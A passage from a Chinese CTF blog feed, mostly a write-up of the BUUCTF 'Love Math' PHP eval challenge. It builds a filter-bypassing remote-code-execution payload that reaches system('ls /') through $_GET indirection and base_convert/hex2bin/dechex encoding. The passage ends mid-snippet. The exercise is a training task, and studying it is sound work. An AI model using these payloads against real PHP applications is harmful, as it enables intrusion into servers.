txt">password字段第1列的值:flag&#123;0ca992a6-fc81-43d7-8419-deba5dea5107&#125;<br></code></pre></td></tr></table></figure><p>flag &#x3D; flag{0ca992a6-fc81-43d7-8419-deba5dea5107}</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF_WEB_[CISCN 2019 初赛]Love Math 题解</title>
    <link href="/2023/08/24/2023-08-24-Love%20Math/"/>
    <url>/2023/08/24/2023-08-24-Love%20Math/</url>
    
    <content type="html"><![CDATA[<h2 id="CISCN-2019-初赛-Love-Math"><a href="#CISCN-2019-初赛-Love-Math" class="headerlink" title="[CISCN 2019 初赛]Love Math"></a>[CISCN 2019 初赛]Love Math</h2><p>1.打开网页发现是PHP代码:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-comment">//例子 c=20-1</span><br>    <span class="hljs-variable">$content</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$content</span>) &gt;= <span class="hljs-number">80</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;太长了不会算&quot;</span>);<br>    &#125;<br>    <span class="hljs-variable">$blacklist</span> = [<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;\t&#x27;</span>, <span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span>, <span class="hljs-string">&#x27;\[&#x27;</span>, <span class="hljs-string">&#x27;\]&#x27;</span>];<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$blacklist</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$blackitem</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$blackitem</span> . <span class="hljs-string">&#x27;/m&#x27;</span>, <span class="hljs-variable">$content</span>)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;请不要输入奇奇怪怪的字符&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span><br>    <span class="hljs-variable">$whitelist</span> = [<span class="hljs-string">&#x27;abs&#x27;</span>, <span class="hljs-string">&#x27;acos&#x27;</span>, <span class="hljs-string">&#x27;acosh&#x27;</span>, <span class="hljs-string">&#x27;asin&#x27;</span>, <span class="hljs-string">&#x27;asinh&#x27;</span>, <span class="hljs-string">&#x27;atan2&#x27;</span>, <span class="hljs-string">&#x27;atan&#x27;</span>, <span class="hljs-string">&#x27;atanh&#x27;</span>, <span class="hljs-string">&#x27;base_convert&#x27;</span>, <span class="hljs-string">&#x27;bindec&#x27;</span>, <span class="hljs-string">&#x27;ceil&#x27;</span>, <span class="hljs-string">&#x27;cos&#x27;</span>, <span class="hljs-string">&#x27;cosh&#x27;</span>, <span class="hljs-string">&#x27;decbin&#x27;</span>, <span class="hljs-string">&#x27;dechex&#x27;</span>, <span class="hljs-string">&#x27;decoct&#x27;</span>, <span class="hljs-string">&#x27;deg2rad&#x27;</span>, <span class="hljs-string">&#x27;exp&#x27;</span>, <span class="hljs-string">&#x27;expm1&#x27;</span>, <span class="hljs-string">&#x27;floor&#x27;</span>, <span class="hljs-string">&#x27;fmod&#x27;</span>, <span class="hljs-string">&#x27;getrandmax&#x27;</span>, <span class="hljs-string">&#x27;hexdec&#x27;</span>, <span class="hljs-string">&#x27;hypot&#x27;</span>, <span class="hljs-string">&#x27;is_finite&#x27;</span>, <span class="hljs-string">&#x27;is_infinite&#x27;</span>, <span class="hljs-string">&#x27;is_nan&#x27;</span>, <span class="hljs-string">&#x27;lcg_value&#x27;</span>, <span class="hljs-string">&#x27;log10&#x27;</span>, <span class="hljs-string">&#x27;log1p&#x27;</span>, <span class="hljs-string">&#x27;log&#x27;</span>, <span class="hljs-string">&#x27;max&#x27;</span>, <span class="hljs-string">&#x27;min&#x27;</span>, <span class="hljs-string">&#x27;mt_getrandmax&#x27;</span>, <span class="hljs-string">&#x27;mt_rand&#x27;</span>, <span class="hljs-string">&#x27;mt_srand&#x27;</span>, <span class="hljs-string">&#x27;octdec&#x27;</span>, <span class="hljs-string">&#x27;pi&#x27;</span>, <span class="hljs-string">&#x27;pow&#x27;</span>, <span class="hljs-string">&#x27;rad2deg&#x27;</span>, <span class="hljs-string">&#x27;rand&#x27;</span>, <span class="hljs-string">&#x27;round&#x27;</span>, <span class="hljs-string">&#x27;sin&#x27;</span>, <span class="hljs-string">&#x27;sinh&#x27;</span>, <span class="hljs-string">&#x27;sqrt&#x27;</span>, <span class="hljs-string">&#x27;srand&#x27;</span>, <span class="hljs-string">&#x27;tan&#x27;</span>, <span class="hljs-string">&#x27;tanh&#x27;</span>];<br>    <span class="hljs-title function_ invoke__">preg_match_all</span>(<span class="hljs-string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, <span class="hljs-variable">$content</span>, <span class="hljs-variable">$used_funcs</span>);  <br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$used_funcs</span>[<span class="hljs-number">0</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$func</span>) &#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$func</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;请不要输入奇奇怪怪的函数&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//帮你算出答案</span><br>    <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;echo &#x27;</span>.<span class="hljs-variable">$content</span>.<span class="hljs-string">&#x27;;&#x27;</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>2.代码审计:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span><br><span class="hljs-comment">//isset函数用于判断该变量是否为null,如果为null返回flase</span><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-comment">//例子 c=20-1</span><br>    <span class="hljs-comment">//将GET方法获取的内容传输给变量content</span><br>    <span class="hljs-variable">$content</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-comment">//判断输入的内容长度是否&gt;=80</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$content</span>) &gt;= <span class="hljs-number">80</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;太长了不会算&quot;</span>);<br>    &#125;<br>    <span class="hljs-comment">//设置黑名单数据:空格,\t,\r,&#x27;,&quot;,`,[,]</span><br>    <span class="hljs-variable">$blacklist</span> = [<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;\t&#x27;</span>, <span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span>, <span class="hljs-string">&#x27;\[&#x27;</span>, <span class="hljs-string">&#x27;\]&#x27;</span>];<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$blacklist</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$blackitem</span>) &#123;<span class="hljs-comment">//遍历黑名单数据</span><br>        <span class="hljs-comment">//正则表达式/m表示多行匹配</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$blackitem</span> . <span class="hljs-string">&#x27;/m&#x27;</span>, <span class="hljs-variable">$content</span>)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;请不要输入奇奇怪怪的字符&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span><br>    <span class="hljs-comment">//设置可以被允许使用的函数名单</span><br>    <span class="hljs-variable">$whitelist</span> = [<span class="hljs-string">&#x27;abs&#x27;</span>, <span class="hljs-string">&#x27;acos&#x27;</span>, <span class="hljs-string">&#x27;acosh&#x27;</span>, <span class="hljs-string">&#x27;asin&#x27;</span>, <span class="hljs-string">&#x27;asinh&#x27;</span>, <span class="hljs-string">&#x27;atan2&#x27;</span>, <span class="hljs-string">&#x27;atan&#x27;</span>, <span class="hljs-string">&#x27;atanh&#x27;</span>, <span class="hljs-string">&#x27;base_convert&#x27;</span>, <span class="hljs-string">&#x27;bindec&#x27;</span>, <span class="hljs-string">&#x27;ceil&#x27;</span>, <span class="hljs-string">&#x27;cos&#x27;</span>, <span class="hljs-string">&#x27;cosh&#x27;</span>, <span class="hljs-string">&#x27;decbin&#x27;</span>, <span class="hljs-string">&#x27;dechex&#x27;</span>, <span class="hljs-string">&#x27;decoct&#x27;</span>, <span class="hljs-string">&#x27;deg2rad&#x27;</span>, <span class="hljs-string">&#x27;exp&#x27;</span>, <span class="hljs-string">&#x27;expm1&#x27;</span>, <span class="hljs-string">&#x27;floor&#x27;</span>, <span class="hljs-string">&#x27;fmod&#x27;</span>, <span class="hljs-string">&#x27;getrandmax&#x27;</span>, <span class="hljs-string">&#x27;hexdec&#x27;</span>, <span class="hljs-string">&#x27;hypot&#x27;</span>, <span class="hljs-string">&#x27;is_finite&#x27;</span>, <span class="hljs-string">&#x27;is_infinite&#x27;</span>, <span class="hljs-string">&#x27;is_nan&#x27;</span>, <span class="hljs-string">&#x27;lcg_value&#x27;</span>, <span class="hljs-string">&#x27;log10&#x27;</span>, <span class="hljs-string">&#x27;log1p&#x27;</span>, <span class="hljs-string">&#x27;log&#x27;</span>, <span class="hljs-string">&#x27;max&#x27;</span>, <span class="hljs-string">&#x27;min&#x27;</span>, <span class="hljs-string">&#x27;mt_getrandmax&#x27;</span>, <span class="hljs-string">&#x27;mt_rand&#x27;</span>, <span class="hljs-string">&#x27;mt_srand&#x27;</span>, <span class="hljs-string">&#x27;octdec&#x27;</span>, <span class="hljs-string">&#x27;pi&#x27;</span>, <span class="hljs-string">&#x27;pow&#x27;</span>, <span class="hljs-string">&#x27;rad2deg&#x27;</span>, <span class="hljs-string">&#x27;rand&#x27;</span>, <span class="hljs-string">&#x27;round&#x27;</span>, <span class="hljs-string">&#x27;sin&#x27;</span>, <span class="hljs-string">&#x27;sinh&#x27;</span>, <span class="hljs-string">&#x27;sqrt&#x27;</span>, <span class="hljs-string">&#x27;srand&#x27;</span>, <span class="hljs-string">&#x27;tan&#x27;</span>, <span class="hljs-string">&#x27;tanh&#x27;</span>];<br>    <span class="hljs-comment">//$used_funcs用于存储匹配到的字符串</span><br>    <span class="hljs-title function_ invoke__">preg_match_all</span>(<span class="hljs-string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, <span class="hljs-variable">$content</span>, <span class="hljs-variable">$used_funcs</span>); <br>    <span class="hljs-comment">//$used_funcs[0]:表示数组used_funcs的起始地址，使func从数组第一个开始取，直到最后一个 </span><br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$used_funcs</span>[<span class="hljs-number">0</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$func</span>) &#123;<span class="hljs-comment">//遍历匹配到的字符串</span><br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$func</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>            <span class="hljs-comment">//匹配到的字符串如果不存在于白名单中</span><br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;请不要输入奇奇怪怪的函数&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//帮你算出答案</span><br>    <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;echo &#x27;</span>.<span class="hljs-variable">$content</span>.<span class="hljs-string">&#x27;;&#x27;</span>);<span class="hljs-comment">//有危险函数执行，可以通过$content=system(&quot;ls /&quot;)执行恶意代码</span><br>&#125; <br></code></pre></td></tr></table></figure><p>函数介绍:<br><strong>issert:</strong></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">用于判断变量的内容是否为空，如果为null,则返回false<br></code></pre></td></tr></table></figure><p><strong>show_source(filename,return)</strong>:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs txt">show_source() 函数对文件进行 PHP 语法高亮显示。语法通过使用 HTML 标签进行高亮。<br><br>用于高亮的颜色可通过 php.ini 文件进行设置或者通过调用 ini_set() 函数进行设置。<br><br>show_source() 是 highlight_file() 的别名。<br><br>注释：当使用该函数时，整个文件都将被显示，包括密码和其他敏感信息！<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-24_LoveMath/image-20230824101642383.png" alt="image-20230824101642383"></p><p><strong>int preg_match ( string $pattern , string $subject [, array &amp;$matches [, int $flags &#x3D; 0 [, int $offset &#x3D; 0 ]]] ):</strong><br><img src="/images/2023-8-24_LoveMath/image-20230824102848164.png" alt="image-20230824102848164"></p><p><strong>in_array(search,array,type)</strong></p><p><img src="/images/2023-8-24_LoveMath/image-20230824104747383.png" alt="image-20230824104747383"></p><p>3.分析:<br><strong>由于我们需要利用最后eval()函数执行恶意代码，所以最后content的值应该为:</strong><br><strong>system(“ls &#x2F;“)</strong></p><p>测试代码:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$content</span> = <span class="hljs-string">&#x27;system(&quot;dir&quot;)&#x27;</span>;<br><span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;echo &#x27;</span>.<span class="hljs-variable">$content</span>.<span class="hljs-string">&#x27;;&#x27;</span>);<span class="hljs-comment">//发生函数执行</span><br></code></pre></td></tr></table></figure><p>输出:<br><img src="/images/2023-8-24_LoveMath/image-20230824105712830.png" alt="image-20230824105712830"></p><p>而content的值又是GET(‘c’)进行获取</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?c=system(&quot;ls /&quot;)<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-24_LoveMath/image-20230824105855231.png" alt="image-20230824105855231"></p><p>这是因为我们输入的内容中含有黑名单字符:”,空格</p><p><strong>在PHP代码中没有””命令依然可以被执行:</strong><br>测试:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$content</span> = <span class="hljs-string">&#x27;system(dir)&#x27;</span>;<br><span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;echo &#x27;</span>.<span class="hljs-variable">$content</span>.<span class="hljs-string">&#x27;;&#x27;</span>);<span class="hljs-comment">//发生函数执行</span><br></code></pre></td></tr></table></figure><p>输出:<br><img src="/images/2023-8-24_LoveMath/image-20230824110120472.png" alt="image-20230824110120472"></p><p><strong>由于eval()可以执行正确语法的PHP代码，所以我们可以在eval()中构造一个PHP代码,即用变量保存函数和参数:</strong></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">eval(echo $_GET[&#x27;a&#x27;]($_GET[&#x27;b&#x27;]));<br></code></pre></td></tr></table></figure><p>所以最后构造的payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?c=$_GET[&#x27;a&#x27;]($_GET[&#x27;b&#x27;])&amp;a=system&amp;b=ls /<br></code></pre></td></tr></table></figure><p><strong>GET()函数中也可以不需要单引号’’,并且[]可以使用{}代替</strong></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?c=$_GET&#123;a&#125;($_GET&#123;b&#125;)&amp;a=system&amp;b=ls /<br></code></pre></td></tr></table></figure><p>测试：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;test1&quot;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$a</span>)&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;111&quot;</span>;<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$_GET</span>&#123;a&#125;(<span class="hljs-variable">$_GET</span>&#123;b&#125;);<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?a=system&amp;b=dir <br></code></pre></td></tr></table></figure><p>输出:</p><p><img src="/images/2023-8-24_LoveMath/image-20230824130556447.png" alt="image-20230824130556447"></p><p>在题目的网页中输入后显示:<br>![image-20230824130738728](images&#x2F;2023-8-24_Love Math&#x2F;image-20230824130738728.png)</p><p>这时已经绕过第一层判断，来到第二层判断:</p><p>4.对第二层判断进行绕过:</p><p><strong>函数介绍:</strong><br><strong>base_convert()函数(属于数学函数):</strong><br><img src="/images/2023-8-24_LoveMath/image-20230824131254523.png" alt="image-20230824131254523"></p><h5 id="hex2bin-String-函数（属于字符串函数）"><a href="#hex2bin-String-函数（属于字符串函数）" class="headerlink" title="hex2bin(String) 函数（属于字符串函数）:"></a><strong>hex2bin(String) 函数（属于字符串函数）:</strong></h5><p><img src="/images/2023-8-24_LoveMath/image-20230824131526831.png" alt="image-20230824131526831"></p><h5 id="dechex-函数（属于数学函数）"><a href="#dechex-函数（属于数学函数）" class="headerlink" title="dechex() 函数（属于数学函数）:"></a><strong>dechex() 函数（属于数学函数）:</strong></h5><p><img src="/images/2023-8-24_LoveMath/image-20230824131746347.png" alt="image-20230824131746347"></p><p>现在的payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?c=$_GET&#123;a&#125;($_GET&#123;b&#125;)&amp;a=system&amp;b=ls /<br></code></pre></td></tr></table></figure><p>由于函数:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">preg_match_all(&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;, $content, $used_funcs);<br></code></pre></td></tr></table></figure><p>对该正则表达式的解释:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs txt">[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*:<br>表示第一个字符是以a-z或A-Z或_或不可见字符中的一个，第二个字符是a-z或A-Z或_或数字或不可见字符中的一个<br>且第二个字符的情况可以出现0次或多次(符合PHP对变量名的要求):<br>实例:<br>a9oo9<br>Aa99o<br>_GET<br>不可见字符9oooa<br><br>所以数字开头的字符串不会被匹配<br></code></pre></td></tr></table></figure><p>所以提取的是content字符串中所有的单词，所以最终content会被提取成:GET,a,b</p><p><strong>这些单词都不包含在白名单中，所以要将这些单词进行替换(内部函数名可以被用作是参数名)a&#x3D;&gt;abs,b&#x3D;&gt;atan,GET由于是要函数执行，所以无法被替换:</strong><br>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?c=$_GET&#123;abs&#125;($_GET&#123;atan&#125;)&amp;abs=system&amp;atan=ls /<br></code></pre></td></tr></table></figure><p>我们可以利用数学函数对$_GET进行转码</p><p><strong>36进制介绍(同理17-35进制，就是少了一些字母):</strong></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">三十六进制，是数据的一种表示方法。同我们日常生活中的表示法不一样。它由0-9，A-Z组成，字母不区分大小写。与10进制的对应关系是：0-9对应0-9；A-Z对应10-35<br></code></pre></td></tr></table></figure><p>实例:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs txt">//35=&gt;z<br>print(base_convert(35,10,36).&quot;\n&quot;);<br><br>//37=36+1=&gt;36^1*1+36^0*1=&gt;11<br>print(base_convert(37,10,36).&quot;\n&quot;);<br><br>//9=&gt;9<br>print(base_convert(9,10,36).&quot;\n&quot;);<br><br>//70=&gt;36+34=&gt;36^1*1+36^0*34=&gt;1y<br>print(base_convert(70,10,36).&quot;\n&quot;);<br><br>输出:<br>z<br>11<br>9<br>1y<br></code></pre></td></tr></table></figure><p>我们可以发现通过十进制转36进制可以被0-9和a-z的字符进行表示输出36进制字符串，所以我们可以构造一个特定的十进制值使其被转化为36进制时刚好是字符串函数hex2bin:</p><p>将36进制(36进制包含所有非特殊字符，可以用于表示所有不含特殊字符的函数)hex2bin转化为10进制:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">print</span>(<span class="hljs-title function_ invoke__">base_convert</span>(<span class="hljs-string">&quot;hex2bin&quot;</span>,<span class="hljs-number">36</span>,<span class="hljs-number">10</span>).<span class="hljs-string">&quot;\n&quot;</span>);<br><span class="hljs-comment">//37907361743</span><br></code></pre></td></tr></table></figure><p>由于$_GET函数含有特殊字符，所以必须使用hex2bin将16进制转化为ASCII码的形式进行代换</p><p><strong>将字符串转化为16进制:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs py">s = <span class="hljs-string">&quot;_GET&quot;</span><br>s_hex = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(s)):<br>    s_hex = s_hex+<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(s[i]))[<span class="hljs-number">2</span>:]+<span class="hljs-string">&quot; &quot;</span><br><span class="hljs-built_in">print</span>(s_hex)<br></code></pre></td></tr></table></figure><p>输出:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">5f 47 45 54 <br></code></pre></td></tr></table></figure><p>发现16进制表示中含有字母，所以会被preg_match_all()函数提取，所以要将该16进制转化为10进制，再由dechex() 将10进制转回给16进制</p><p><strong>16进制转10进制：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">print</span>(<span class="hljs-title function_ invoke__">base_convert</span>(<span class="hljs-string">&quot;5f474554&quot;</span>,<span class="hljs-number">16</span>,<span class="hljs-number">10</span>).<span class="hljs-string">&quot;\n&quot;</span>);<br><span class="hljs-comment">//1598506324</span><br></code></pre></td></tr></table></figure><p>_GET的payload的构造:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">_GET=hex2bin(&quot;5f474554&quot;)<br>hex2bin=base_convert(&quot;37907361743&quot;,10,36)()<br>&quot;5f474554&quot;=dechex(&quot;1598506324&quot;)<br>_GET=base_convert(&quot;37907361743&quot;,10,36)(dechex(&quot;1598506324&quot;))<br></code></pre></td></tr></table></figure><p>所以$_GET{}:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">$(base_convert(&quot;37907361743&quot;,10,36)(dechex(&quot;1598506324&quot;)))&#123;&#125;<br></code></pre></td></tr></table></figure><p>5.构造payload</p><p>原来的payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?c=$_GET&#123;abs&#125;($_GET&#123;atan&#125;)&amp;abs=system&amp;atan=ls /<br></code></pre></td></tr></table></figure><p>转换payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?c=$(base_convert(&quot;37907361743&quot;,10,36)(dechex(&quot;1598506324&quot;)))&#123;abs&#125;($(base_convert(&quot;37907361743&quot;,10,36)(dechex(&quot;1598506324&quot;)))&#123;atan&#125;)&amp;abs=system&amp;atan=ls /<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-24_LoveMath/image-20230824143815219.png" alt="image-20230824143815219"></p><p>由于c的长度太长所以必须简化payload</p><p>测试：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;test1&quot;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$a</span>)&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;111&quot;</span>;<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flag is here&quot;</span>;<br><span class="hljs-comment">//$pi=base_convert(37907361743,10,36)(dechex(1598506324));</span><br><span class="hljs-comment">//($$pi)&#123;a&#125;(($$pi)&#123;b&#125;);</span><br><span 